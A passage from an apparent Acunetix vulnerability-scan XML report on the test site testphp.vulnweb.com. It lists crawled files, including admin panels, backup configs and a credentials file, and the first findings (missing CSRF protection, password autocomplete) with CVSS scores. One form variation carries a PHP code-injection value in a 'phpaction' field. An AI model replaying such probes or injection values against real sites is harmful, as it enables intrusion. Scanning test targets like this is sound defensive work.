      <FullURL>http://testphp.vulnweb.com/secured/office_files</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="68">
      <Name>filelist.xml</Name>
      <URL>/secured/office_files/filelist.xml</URL>
      <FullURL>http://testphp.vulnweb.com/secured/office_files/filelist.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="69">
      <Name>comment.php</Name>
      <URL>/comment.php</URL>
      <FullURL>http://testphp.vulnweb.com/comment.php</FullURL>
      <Inputs>
       <Variable Name="aid" Type="URL encoded GET">
       </Variable>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="comment" Type="URL encoded POST">
       </Variable>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="phpaction" Type="URL encoded POST">
       </Variable>
       <Variable Name="pid" Type="URL encoded GET">
       </Variable>
       <Variable Name="aid" Type="URL encoded GET">
       </Variable>
       <Variable Name="pid" Type="URL encoded GET">
       </Variable>
       <Variable Name="aid" Type="URL encoded GET">
       </Variable>
       <Variable Name="pid" Type="URL encoded GET">
       </Variable>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="comment" Type="URL encoded POST">
       </Variable>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="phpaction" Type="URL encoded POST">
       </Variable>
       <Variable Name="Submit" Type="URL encoded POST">
       </Variable>
       <Variable Name="aid" Type="URL encoded GET">
       </Variable>
       <Variable Name="pid" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?aid=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php</URL>
         <PostData><![CDATA[Submit=Submit&amp;comment=1&amp;name=&lt;your%20name%20here&gt;&amp;phpaction=echo%20%24_POST%5bcomment%5d;]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?aid=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?aid=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?pid=7</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?pid=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?pid=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="70">
      <Name>.idea</Name>
      <URL>/.idea/</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="71">
      <Name>.name</Name>
      <URL>/.idea/.name</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/.name</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="72">
      <Name>acuart.iml</Name>
      <URL>/.idea/acuart.iml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/acuart.iml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="73">
      <Name>encodings.xml</Name>
      <URL>/.idea/encodings.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/encodings.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="74">
      <Name>misc.xml</Name>
      <URL>/.idea/misc.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/misc.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="75">
      <Name>modules.xml</Name>
      <URL>/.idea/modules.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/modules.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="76">
      <Name>scopes</Name>
      <URL>/.idea/scopes/</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/scopes/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="77">
      <Name>scope_settings.xml</Name>
      <URL>/.idea/scopes/scope_settings.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/scopes/scope_settings.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="78">
      <Name>vcs.xml</Name>
      <URL>/.idea/vcs.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/vcs.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="79">
      <Name>workspace.xml</Name>
      <URL>/.idea/workspace.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/workspace.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="80">
      <Name>_mmServerScripts</Name>
      <URL>/_mmServerScripts/</URL>
      <FullURL>http://testphp.vulnweb.com/_mmServerScripts/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="81">
      <Name>MMHTTPDB.php</Name>
      <URL>/_mmServerScripts/MMHTTPDB.php</URL>
      <FullURL>http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php</FullURL>
      <Inputs>
       <Variable Name="Type" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="82">
      <Name>mysql.php</Name>
      <URL>/_mmServerScripts/mysql.php</URL>
      <FullURL>http://testphp.vulnweb.com/_mmServerScripts/mysql.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="83">
      <Name>404.php</Name>
      <URL>/404.php</URL>
      <FullURL>http://testphp.vulnweb.com/404.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="84">
      <Name>adm1nPan3l</Name>
      <URL>/adm1nPan3l/</URL>
      <FullURL>http://testphp.vulnweb.com/adm1nPan3l/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="85">
      <Name>index.php</Name>
      <URL>/adm1nPan3l/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/adm1nPan3l/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="86">
      <Name>admin</Name>
      <URL>/admin/</URL>
      <FullURL>http://testphp.vulnweb.com/admin/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="87">
      <Name>create.sql</Name>
      <URL>/admin/create.sql</URL>
      <FullURL>http://testphp.vulnweb.com/admin/create.sql</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="88">
      <Name>bxss</Name>
      <URL>/bxss/</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="89">
      <Name>adminPan3l</Name>
      <URL>/bxss/adminPan3l/</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/adminPan3l/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="90">
      <Name>index.php</Name>
      <URL>/bxss/adminPan3l/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/adminPan3l/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="91">
      <Name>style.css</Name>
      <URL>/bxss/adminPan3l/style.css</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/adminPan3l/style.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="92">
      <Name>cleanDatabase.php</Name>
      <URL>/bxss/cleanDatabase.php</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/cleanDatabase.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="93">
      <Name>database_connect.php</Name>
      <URL>/bxss/database_connect.php</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/database_connect.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="94">
      <Name>index.php</Name>
      <URL>/bxss/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="95">
      <Name>test.js</Name>
      <URL>/bxss/test.js</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/test.js</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="96">
      <Name>vuln.php</Name>
      <URL>/bxss/vuln.php</URL>
      <FullURL>http://testphp.vulnweb.com/bxss/vuln.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/bxss/vuln.php?id=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="97">
      <Name>clearguestbook.php</Name>
      <URL>/clearguestbook.php</URL>
      <FullURL>http://testphp.vulnweb.com/clearguestbook.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="98">
      <Name>clientaccesspolicy.xml</Name>
      <URL>/clientaccesspolicy.xml</URL>
      <FullURL>http://testphp.vulnweb.com/clientaccesspolicy.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="99">
      <Name>Connections</Name>
      <URL>/Connections/</URL>
      <FullURL>http://testphp.vulnweb.com/Connections/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="100">
      <Name>DB_Connection.php</Name>
      <URL>/Connections/DB_Connection.php</URL>
      <FullURL>http://testphp.vulnweb.com/Connections/DB_Connection.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="101">
      <Name>CVS</Name>
      <URL>/CVS/</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="102">
      <Name>Entries</Name>
      <URL>/CVS/Entries</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Entries</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="103">
      <Name>Entries.Log</Name>
      <URL>/CVS/Entries.Log</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Entries.Log</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="104">
      <Name>Repository</Name>
      <URL>/CVS/Repository</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Repository</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="105">
      <Name>Root</Name>
      <URL>/CVS/Root</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Root</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="106">
      <Name>database_connect.php</Name>
      <URL>/database_connect.php</URL>
      <FullURL>http://testphp.vulnweb.com/database_connect.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="107">
      <Name>index.bak</Name>
      <URL>/index.bak</URL>
      <FullURL>http://testphp.vulnweb.com/index.bak</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="108">
      <Name>logout.php</Name>
      <URL>/logout.php</URL>
      <FullURL>http://testphp.vulnweb.com/logout.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="109">
      <Name>pictures</Name>
      <URL>/pictures/</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="110">
      <Name>1.jpg.tn</Name>
      <URL>/pictures/1.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/1.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="111">
      <Name>2.jpg.tn</Name>
      <URL>/pictures/2.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/2.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="112">
      <Name>3.jpg.tn</Name>
      <URL>/pictures/3.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/3.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="113">
      <Name>4.jpg.tn</Name>
      <URL>/pictures/4.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/4.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="114">
      <Name>5.jpg.tn</Name>
      <URL>/pictures/5.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/5.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="115">
      <Name>6.jpg.tn</Name>
      <URL>/pictures/6.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/6.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="116">
      <Name>7.jpg.tn</Name>
      <URL>/pictures/7.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/7.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="117">
      <Name>8.jpg.tn</Name>
      <URL>/pictures/8.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/8.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="118">
      <Name>credentials.txt</Name>
      <URL>/pictures/credentials.txt</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/credentials.txt</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="119">
      <Name>ipaddresses.txt</Name>
      <URL>/pictures/ipaddresses.txt</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/ipaddresses.txt</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="120">
      <Name>path-disclosure-unix.html</Name>
      <URL>/pictures/path-disclosure-unix.html</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/path-disclosure-unix.html</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="121">
      <Name>path-disclosure-win.html</Name>
      <URL>/pictures/path-disclosure-win.html</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/path-disclosure-win.html</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="122">
      <Name>wp-config.bak</Name>
      <URL>/pictures/wp-config.bak</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/wp-config.bak</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="123">
      <Name>WS_FTP.LOG</Name>
      <URL>/pictures/WS_FTP.LOG</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/WS_FTP.LOG</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="124">
      <Name>sendcommand.php</Name>
      <URL>/sendcommand.php</URL>
      <FullURL>http://testphp.vulnweb.com/sendcommand.php</FullURL>
      <Inputs>
       <Variable Name="cart_id" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="125">
      <Name>wvstests</Name>
      <URL>/wvstests/</URL>
      <FullURL>http://testphp.vulnweb.com/wvstests/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="126">
      <Name>pmwiki_2_1_19</Name>
      <URL>/wvstests/pmwiki_2_1_19/</URL>
      <FullURL>http://testphp.vulnweb.com/wvstests/pmwiki_2_1_19/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="127">
      <Name>scripts</Name>
      <URL>/wvstests/pmwiki_2_1_19/scripts/</URL>
      <FullURL>http://testphp.vulnweb.com/wvstests/pmwiki_2_1_19/scripts/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="128">
      <Name>version.php</Name>
      <URL>/wvstests/pmwiki_2_1_19/scripts/version.php</URL>
      <FullURL>http://testphp.vulnweb.com/wvstests/pmwiki_2_1_19/scripts/version.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="129">
      <Name>medias</Name>
      <URL>/medias</URL>
      <FullURL>http://testphp.vulnweb.com/medias</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="130">
      <Name>img</Name>
      <URL>/medias/img</URL>
      <FullURL>http://testphp.vulnweb.com/medias/img</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="131">
      <Name>css</Name>
      <URL>/medias/css</URL>
      <FullURL>http://testphp.vulnweb.com/medias/css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="132">
      <Name>main.css</Name>
      <URL>/medias/css/main.css</URL>
      <FullURL>http://testphp.vulnweb.com/medias/css/main.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="133">
      <Name>js</Name>
      <URL>/medias/js</URL>
      <FullURL>http://testphp.vulnweb.com/medias/js</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="134">
      <Name>common_functions.js</Name>
      <URL>/medias/js/common_functions.js</URL>
      <FullURL>http://testphp.vulnweb.com/medias/js/common_functions.js</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
   </SiteFiles>
  </Crawler>
    <ReportItems>

      <ReportItem id="0" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">&lt;empty&gt;</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/search.php?test=query</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>searchFor [Text]</li><li>goButton [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:01 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4096
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="1" color="green">
       <Name><![CDATA[Password type input with auto-complete enabled]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Password type input named <b><font color="dark">pass</font></b> from form named <b>loginform</b> with action <b>userinfo.php</b> has autocomplete enabled.]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[When a new name and password is entered in a form and the form is submitted, the browser asks if the password should be saved.Thereafter when the form is displayed, the name and password are filled in automatically or are completed as the name is entered. An attacker with local access could obtain the cleartext password from the browser cache.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[The password auto-complete should be disabled in sensitive applications. <br/>To disable auto-complete, you may use a code similar to: <pre wrap="virtual"><code>&lt;INPUT TYPE=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot;&gt;</code></pre>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:02 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
